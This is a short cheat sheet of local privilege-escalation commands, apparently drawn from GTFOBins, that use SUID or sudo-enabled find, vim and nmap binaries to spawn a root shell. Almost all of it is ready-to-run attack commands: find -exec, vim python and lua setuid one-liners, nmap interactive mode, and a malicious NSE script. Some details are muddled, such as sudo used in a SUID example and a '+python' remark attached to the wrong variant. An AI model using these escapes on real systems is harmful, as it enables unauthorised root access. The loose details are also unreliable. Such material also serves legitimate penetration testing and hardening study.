`find`, `vim`, `nmap` — all three have GTFOBins SUID escapes.

**find**
```bash
sudo find . -exec /bin/sh -p \; -quit
```
`-p` keeps euid. Without `-p`, sh drops privileges.

**vim**
```bash
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","exec /bin/sh -p")'
```
Older/simpler variant (works when vim built with `+python`):
```bash
vim -c ':!/bin/sh'
```
`:!` only helps if vim binary itself is SUID — the spawned shell inherits euid only with `-p`. Reliable path is the `py3`/`python` `setuid(0)` route above, or:
```bash
vim -c ':lua os.execute("exec /bin/sh -p")'
```

**nmap**
```bash
nmap --interactive
nmap> !sh
```
`--interactive` removed in nmap 7.60+. Modern:
```bash
nmap --script /path/to/evil.nse
```
where script uses `os.execute("/bin/sh -p")`. Or older `--datadir` + `os.execute` in a script.

skipped: full GTFOBins list — check gtfobins.github.io for the rest.